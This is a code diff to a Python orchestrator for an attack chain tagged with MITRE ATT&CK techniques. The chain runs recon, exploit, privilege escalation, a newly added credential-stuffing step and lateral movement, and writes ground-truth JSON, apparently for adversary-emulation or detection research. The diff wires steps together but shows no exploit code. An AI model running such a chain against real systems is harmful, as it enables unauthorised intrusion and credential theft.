@@ -9,7 +9,7 @@ adapter that reads from / writes to a shared ``Context``.
 Add a new step by:
   1. Writing the module under ``Attack-chain/`` with a top-level entry function.
   2. Adding an ``_step_<name>`` adapter below.
-  3. Appending a ``Step(...)`` entry to ``CHAIN``.
+  3. Appending a ``Step(...)`` entry to ``CHAIN_BASIC`` (and/or ``CHAIN_ADVANCED``).
 """
 
 from __future__ import annotations
@@ -56,6 +56,11 @@ STEP_META = {
         "techniques": ["T1053.003", "T1068"],
         "color": "red",
     },
+    "creds": {
+        "tactic": "TA0006 · Credential Access · TA0007 · Discovery",
+        "techniques": ["T1552.001", "T1018", "T1046", "T1110.004"],
+        "color": "blue",
+    },
     "lateral": {
         "tactic": "TA0008 · Lateral Movement",
         "techniques": ["T1021.004", "T1078"],
@@ -73,6 +78,7 @@ class Context:
     results_dir: str = DEFAULT_RESULTS_DIR
     kali_host: str = DEFAULT_KALI_HOST
     wordlist: str = DEFAULT_WORDLIST
+    mode: str = "basic"
     state: dict[str, Any] = field(default_factory=dict)
 
 
@@ -93,6 +99,7 @@ class Step:
 def _print_banner(ctx: Context, steps: list[Step]) -> None:
     title = Text("⛓  ATTACK CHAIN", style="bold white")
     meta = (
+        f"[dim]Mode:[/dim] [bold cyan]{ctx.mode}[/bold cyan]   "
         f"[dim]Target:[/dim] [bold cyan]{ctx.target}[/bold cyan]   "
         f"[dim]Kali:[/dim] [bold cyan]{ctx.kali_host}[/bold cyan]   "
         f"[dim]Steps:[/dim] [bold white]{', '.join(s.name for s in steps)}[/bold white]"
@@ -153,6 +160,7 @@ def _write_ground_truth(ctx: Context, run_id: str, results: list[dict]) -> None:
     out_path = out_dir / f"chain-{sanitized}.json"
     payload = {
         "run_id": run_id,
+        "mode": ctx.mode,
         "target": ctx.target,
         "kali": ctx.kali_host,
         "steps": results,
@@ -218,12 +226,27 @@ def _step_privesc(ctx: Context) -> dict[str, Any]:
     return {"root_shell": root_shell}
 
 
+def _step_creds(ctx: Context) -> dict[str, Any]:
+    from credential_stuffing import run as creds_run
+
+    result = creds_run(ctx.state["root_shell"])
+    if not result.get("john_ip"):
+        raise RuntimeError("credential stuffing found no usable account on the internal subnet")
+    return {
+        "john_ip": result["john_ip"],
+        "john_password": result["john_password"],
+        "creds_scan": result.get("scanned_hosts", []),
+        "creds_successes": result.get("successes", []),
+    }
+
+
 def _step_lateral(ctx: Context) -> dict[str, Any]:
     from lateral_movement import run as lateral_run
 
     john_shell = lateral_run(
         root_shell=ctx.state["root_shell"],
         kali_host=ctx.kali_host,
+        workstation_ip=ctx.state.get("john_ip"),
     )
     if john_shell is None:
         raise RuntimeError("lateral movement returned no john.stravidis shell")
@@ -246,7 +269,7 @@ def _teardown_close_socket(key: str) -> Callable[[Context], None]:
 # Chain definition
 # ---------------------------------------------------------------------------
 
-CHAIN: list[Step] = [
+CHAIN_BASIC: list[Step] = [
     Step("recon", _step_recon),
     Step("exploit", _step_exploit, teardown=_teardown_close_socket("www_shell")),
     Step(
@@ -256,12 +279,46 @@ CHAIN: list[Step] = [
         teardown=_teardown_close_socket("root_shell"),
     ),
     Step(
+        "creds",
+        _step_creds,
+        requires=("root_shell",),
+    ),
+    Step(
         "lateral",
         _step_lateral,
-        requires=("root_shell",),
+        requires=("root_shell",),  # john_ip optional: used if present, else deploy.log fallback
         teardown=_teardown_close_socket("john_shell"),
     ),
 ]
+
+# Advanced mode reuses the basic chain until stealthier per-step variants land;
+# swap entries in CHAIN_ADVANCED as they're implemented.
+CHAIN_ADVANCED: list[Step] = list(CHAIN_BASIC)
+
+CHAINS: dict[str, list[Step]] = {
+    "basic": CHAIN_BASIC,
+    "advanced": CHAIN_ADVANCED,
+}
+
+DEFAULT_MODE = "basic"
+
+MODE_ALIASES: dict[str, str] = {
+    "b": "basic",
+    "basic": "basic",
+    "a": "advanced",
+    "adv": "advanced",
+    "advanced": "advanced",
+}
+
+
+def _parse_mode(value: str) -> str:
+    key = value.strip().lower()
+    if key not in MODE_ALIASES:
+        valid = ", ".join(sorted(MODE_ALIASES))
+        raise argparse.ArgumentTypeError(
+            f"invalid mode {value!r}; choose one of: {valid}"
+        )
+    return MODE_ALIASES[key]
 
 
 # ---------------------------------------------------------------------------
@@ -306,7 +363,8 @@ def _result_entry(step: Step, *, ok: bool, started: str, ended: str,
 
 
 def run_chain(ctx: Context, *, only=None, start=None, stop=None) -> Context:
-    selected = _select(CHAIN, only=only, start=start, stop=stop)
+    chain = CHAINS[ctx.mode]
+    selected = _select(chain, only=only, start=start, stop=stop)
 
     run_id = _iso_utc()
     run_dir = Path(ctx.results_dir) / f"run-{_sanitize_run_id(run_id)}"
@@ -386,8 +444,22 @@ def _parse_args(argv: list[str]) -> argparse.Namespace:
     p.add_argument("--results-dir", default=DEFAULT_RESULTS_DIR)
     p.add_argument("--kali-host", default=DEFAULT_KALI_HOST)
     p.add_argument("--wordlist", default=DEFAULT_WORDLIST)
+    p.add_argument(
+        "--mode",
+        type=_parse_mode,
+        default=DEFAULT_MODE,
+        metavar="{basic,advanced}",
+        help=(
+            "scenario variant to execute, case-insensitive; "
+            "aliases: basic/b, advanced/a/adv (default: basic)"
+        ),
+    )
 
-    step_names = [s.name for s in CHAIN]
+    seen: dict[str, None] = {}
+    for chain in CHAINS.values():
+        for step in chain:
+            seen.setdefault(step.name, None)
+    step_names = list(seen)
     sel = p.add_mutually_exclusive_group()
     sel.add_argument("--only", choices=step_names)
     sel.add_argument("--from", dest="start", choices=step_names)
@@ -401,9 +473,9 @@ def _parse_args(argv: list[str]) -> argparse.Namespace:
     return args
 
 
-def _list_steps() -> None:
-    console.print(Rule("[dim]configured steps[/dim]", style="dim"))
-    for step in CHAIN:
+def _list_steps(mode: str = DEFAULT_MODE) -> None:
+    console.print(Rule(f"[dim]configured steps ({mode})[/dim]", style="dim"))
+    for step in CHAINS[mode]:
         meta = STEP_META.get(step.name, {})
         color = meta.get("color", "white")
         reqs = (
@@ -428,7 +500,7 @@ def main(argv: list[str] | None = None) -> int:
         format="[dim][%(name)s][/dim] %(message)s",
     )
     if args.list:
-        _list_steps()
+        _list_steps(args.mode)
         return 0
 
     ctx = Context(
@@ -436,6 +508,7 @@ def main(argv: list[str] | None = None) -> int:
         results_dir=args.results_dir,
         kali_host=args.kali_host,
         wordlist=args.wordlist,
+        mode=args.mode,
     )
     run_chain(ctx, only=args.only, start=args.start, stop=args.stop)
     return 0
